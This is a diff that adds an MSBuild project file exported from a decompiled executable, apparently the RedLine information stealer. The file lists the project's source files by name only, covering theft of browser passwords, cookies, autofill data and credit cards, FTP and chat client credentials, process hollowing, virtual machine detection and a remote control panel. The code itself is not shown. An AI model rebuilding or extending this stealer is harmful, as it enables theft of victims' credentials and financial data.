@@ -1,0 +1,170 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <!--Project was exported from assembly: C:\Users\privoxy\Desktop\321.exe-->
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{9B8EA58C-5735-4A15-B791-CE839DFFF0A0}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <AssemblyName>RedLine.Client</AssemblyName>
+    <TargetFrameworkVersion>v4.0</TargetFrameworkVersion>
+    <TargetFrameworkProfile />
+    <ApplicationVersion>1.0.0.0</ApplicationVersion>
+    <FileAlignment>512</FileAlignment>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="System.Core" />
+    <Reference Include="System.ServiceModel" />
+    <Reference Include="System" />
+    <Reference Include="System.Runtime.Serialization" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Xml" />
+    <Reference Include="System.Security" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="System.Data" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="Org\BouncyCastle\Utilities\Arrays.cs" />
+    <Compile Include="Org\BouncyCastle\Crypto\CryptoException.cs" />
+    <Compile Include="Org\BouncyCastle\Crypto\DataLengthException.cs" />
+    <Compile Include="Org\BouncyCastle\Crypto\IBlockCipher.cs" />
+    <Compile Include="Org\BouncyCastle\Crypto\ICipherParameters.cs" />
+    <Compile Include="Org\BouncyCastle\Crypto\InvalidCipherTextException.cs" />
+    <Compile Include="Org\BouncyCastle\Crypto\Utilities\Pack.cs" />
+    <Compile Include="Org\BouncyCastle\Crypto\Modes\GcmBlockCipher.cs" />
+    <Compile Include="Org\BouncyCastle\Crypto\Modes\IAeadBlockCipher.cs" />
+    <Compile Include="Org\BouncyCastle\Crypto\Modes\Gcm\GcmUtilities.cs" />
+    <Compile Include="Org\BouncyCastle\Crypto\Modes\Gcm\IGcmMultiplier.cs" />
+    <Compile Include="Org\BouncyCastle\Crypto\Modes\Gcm\Tables8kGcmMultiplier.cs" />
+    <Compile Include="Org\BouncyCastle\Crypto\Engines\AesFastEngine.cs" />
+    <Compile Include="Org\BouncyCastle\Crypto\Parameters\AeadParameters.cs" />
+    <Compile Include="Org\BouncyCastle\Crypto\Parameters\KeyParameter.cs" />
+    <Compile Include="Org\BouncyCastle\Crypto\Parameters\ParametersWithIV.cs" />
+    <Compile Include="RedLine\IRemotePanel.cs" />
+    <Compile Include="RedLine\Program.cs" />
+    <Compile Include="RedLine\Service`1.cs" />
+    <Compile Include="RedLine\Models\ClientSettings.cs" />
+    <Compile Include="RedLine\Models\Credentials.cs" />
+    <Compile Include="RedLine\Models\GeoInfo.cs" />
+    <Compile Include="RedLine\Models\Hardware.cs" />
+    <Compile Include="RedLine\Models\HardwareType.cs" />
+    <Compile Include="RedLine\Models\InstalledBrowserInfo.cs" />
+    <Compile Include="RedLine\Models\MachineType.cs" />
+    <Compile Include="RedLine\Models\ProtectionSettings.cs" />
+    <Compile Include="RedLine\Models\RemoteFile.cs" />
+    <Compile Include="RedLine\Models\LoginPair.cs" />
+    <Compile Include="RedLine\Models\RemoteTask.cs" />
+    <Compile Include="RedLine\Models\RemoteTaskAction.cs" />
+    <Compile Include="RedLine\Models\UserLog.cs" />
+    <Compile Include="RedLine\Models\WMI\IWmiService.cs" />
+    <Compile Include="RedLine\Models\WMI\WmiBaseBoard.cs" />
+    <Compile Include="RedLine\Models\WMI\WmiBaseBoardQuery.cs" />
+    <Compile Include="RedLine\Models\WMI\WmiDiskDrive.cs" />
+    <Compile Include="RedLine\Models\WMI\WmiDiskDriveQuery.cs" />
+    <Compile Include="RedLine\Models\WMI\WmiAntivirusQuery.cs" />
+    <Compile Include="RedLine\Models\WMI\WmiAntiSpyWareQuery.cs" />
+    <Compile Include="RedLine\Models\WMI\WmiFirewallQuery.cs" />
+    <Compile Include="RedLine\Models\WMI\WmiGraphicCardQuery.cs" />
+    <Compile Include="RedLine\Models\WMI\WmiAntivirus.cs" />
+    <Compile Include="RedLine\Models\WMI\WmiGraphicCard.cs" />
+    <Compile Include="RedLine\Models\WMI\WmiNetworkAdapter.cs" />
+    <Compile Include="RedLine\Models\WMI\WmiNetworkAdapterQuery.cs" />
+    <Compile Include="RedLine\Models\WMI\WmiNetworkAdapterType.cs" />
+    <Compile Include="RedLine\Models\WMI\WmiProcess.cs" />
+    <Compile Include="RedLine\Models\WMI\WmiProcessor.cs" />
+    <Compile Include="RedLine\Models\WMI\WmiProcessorQuery.cs" />
+    <Compile Include="RedLine\Models\WMI\WmiProcessQuery.cs" />
+    <Compile Include="RedLine\Models\WMI\WmiQueryBase.cs" />
+    <Compile Include="RedLine\Models\WMI\WmiResultAttribute.cs" />
+    <Compile Include="RedLine\Models\WMI\WmiService.cs" />
+    <Compile Include="RedLine\Models\UAC\AdminPromptType.cs" />
+    <Compile Include="RedLine\Models\RunPE\LoadParams.cs" />
+    <Compile Include="RedLine\Models\RunPE\NativeDelegates.cs" />
+    <Compile Include="RedLine\Models\RunPE\CONTEXT.cs" />
+    <Compile Include="RedLine\Models\RunPE\IMAGE_DOS_HEADER.cs" />
+    <Compile Include="RedLine\Models\RunPE\IMAGE_FILE_HEADER.cs" />
+    <Compile Include="RedLine\Models\RunPE\IMAGE_NT_HEADERS.cs" />
+    <Compile Include="RedLine\Models\RunPE\IMAGE_OPTIONAL_HEADER.cs" />
+    <Compile Include="RedLine\Models\RunPE\IMAGE_SECTION_HEADER.cs" />
+    <Compile Include="RedLine\Models\RunPE\PROCESS_INFORMATION.cs" />
+    <Compile Include="RedLine\Models\RunPE\STARTUPINFO.cs" />
+    <Compile Include="RedLine\Models\Gecko\Asn1Object.cs" />
+    <Compile Include="RedLine\Models\Gecko\Asn1Type.cs" />
+    <Compile Include="RedLine\Models\Gecko\GeckoLogin.cs" />
+    <Compile Include="RedLine\Models\Gecko\GeckoTable.cs" />
+    <Compile Include="RedLine\Models\Gecko\PasswordCheck.cs" />
+    <Compile Include="RedLine\Models\Browsers\Autofill.cs" />
+    <Compile Include="RedLine\Models\Browsers\Browser.cs" />
+    <Compile Include="RedLine\Models\Browsers\Cookie.cs" />
+    <Compile Include="RedLine\Models\Browsers\CreditCard.cs" />
+    <Compile Include="RedLine\Models\Browsers\Edge\VAULT_ELEMENT_TYPE.cs" />
+    <Compile Include="RedLine\Models\Browsers\Edge\VAULT_ITEM_ELEMENT.cs" />
+    <Compile Include="RedLine\Models\Browsers\Edge\VAULT_ITEM_WIN7.cs" />
+    <Compile Include="RedLine\Models\Browsers\Edge\VAULT_ITEM_WIN8.cs" />
+    <Compile Include="RedLine\Models\Browsers\Edge\VAULT_SCHEMA_ELEMENT_ID.cs" />
+    <Compile Include="RedLine\Client\Models\LocalState.cs" />
+    <Compile Include="RedLine\Client\Models\OsCrypt.cs" />
+    <Compile Include="RedLine\Client\Logic\Others\UserAgentDetector.cs" />
+    <Compile Include="RedLine\Client\Logic\Crypto\AesGcm256.cs" />
+    <Compile Include="RedLine\Logic\SQLite\DataEntry.cs" />
+    <Compile Include="RedLine\Logic\SQLite\SqlConnection.cs" />
+    <Compile Include="RedLine\Logic\SQLite\SQLiteRow.cs" />
+    <Compile Include="RedLine\Logic\SQLite\TypeSizes.cs" />
+    <Compile Include="RedLine\Logic\RunPE\LoadExecutor.cs" />
+    <Compile Include="RedLine\Logic\Others\InstallManager.cs" />
+    <Compile Include="RedLine\Logic\Others\RemoteFileGrabber.cs" />
+    <Compile Include="RedLine\Logic\Others\VmDetector.cs" />
+    <Compile Include="RedLine\Logic\Json\JavaScriptReader.cs" />
+    <Compile Include="RedLine\Logic\Json\JsonArray.cs" />
+    <Compile Include="RedLine\Logic\Json\JsonObject.cs" />
+    <Compile Include="RedLine\Logic\Json\JsonPrimitive.cs" />
+    <Compile Include="RedLine\Logic\Json\JsonType.cs" />
+    <Compile Include="RedLine\Logic\Json\JsonValue.cs" />
+    <Compile Include="RedLine\Logic\ImClient\Pidgin.cs" />
+    <Compile Include="RedLine\Logic\Helpers\DecryptHelper.cs" />
+    <Compile Include="RedLine\Logic\Helpers\GeoHelper.cs" />
+    <Compile Include="RedLine\Logic\Helpers\LibInvoker.cs" />
+    <Compile Include="RedLine\Logic\Helpers\NativeMethods.cs" />
+    <Compile Include="RedLine\Logic\Helpers\OsDetector.cs" />
+    <Compile Include="RedLine\Logic\Helpers\UacHelper.cs" />
+    <Compile Include="RedLine\Logic\Helpers\UserInfoHelper.cs" />
+    <Compile Include="RedLine\Logic\Helpers\TripleDESHelper.cs" />
+    <Compile Include="RedLine\Logic\Helpers\Constants.cs" />
+    <Compile Include="RedLine\Logic\FtpClients\FileZilla.cs" />
+    <Compile Include="RedLine\Logic\FtpClients\WinSCP.cs" />
+    <Compile Include="RedLine\Logic\Extensions\JsonExt.cs" />
+    <Compile Include="RedLine\Logic\Extensions\IsNullExtension.cs" />
+    <Compile Include="RedLine\Logic\Extensions\Extensions.cs" />
+    <Compile Include="RedLine\Logic\Browsers\EdgeEngine.cs" />
+    <Compile Include="RedLine\Logic\Browsers\Gecko\Asn1Factory.cs" />
+    <Compile Include="RedLine\Logic\Browsers\Gecko\GeckoEngine.cs" />
+    <Compile Include="RedLine\Logic\Browsers\Gecko\GeckoDatabase.cs" />
+    <Compile Include="RedLine\Logic\Browsers\Gecko\GeckoPasswordBasedEncryption.cs" />
+    <Compile Include="RedLine\Logic\Browsers\Chromium\ChromiumEngine.cs" />
+    <Compile Include="AssemblyInfo.cs" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
